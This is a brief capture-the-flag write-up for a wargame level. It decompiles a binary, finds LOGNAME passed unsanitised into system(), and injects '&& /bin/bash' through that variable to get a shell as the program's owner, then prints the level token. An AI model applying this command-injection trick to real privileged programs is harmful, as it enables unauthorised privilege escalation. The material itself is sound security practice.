## LEVEL07  
  
We download the binary file  `scp -P 4242 level07@<ip>:/home/user/level07/level07 Documents/`  
  
## GHIDRA  
When we decompile the binary, we see these lines:  
`pcVar1 = getenv("LOGNAME");`  
This line assigns the environment variable `LOGNAME`(`level07`) to `pcVar1`  
`asprintf(&local_1c,"/bin/echo %s ",pcVar1);`  
This line fills `local_1c` with the path to `echo` followed by `pcVar1` wich is `level07`  
`iVar2 = system(local_1c);`  
The program execute `system(local_1c)` and store the result in `iVar2`  
  
## EXPORT  
We change the environment variable `LOGNAME` into `&& /bin/bash` with export.  
The system call executes `LOGNAME`, we can open a new bash with the privileges of the program's owner `flag07`  
`export LOGNAME="&& /bin/bash"`  
`./level07`, then, inside the new bash `getflag` and we get the token.  
  
## GETFLAG TOKEN   
token_passwd_level08: `fiumuikeil55xe9cu4dood66h`  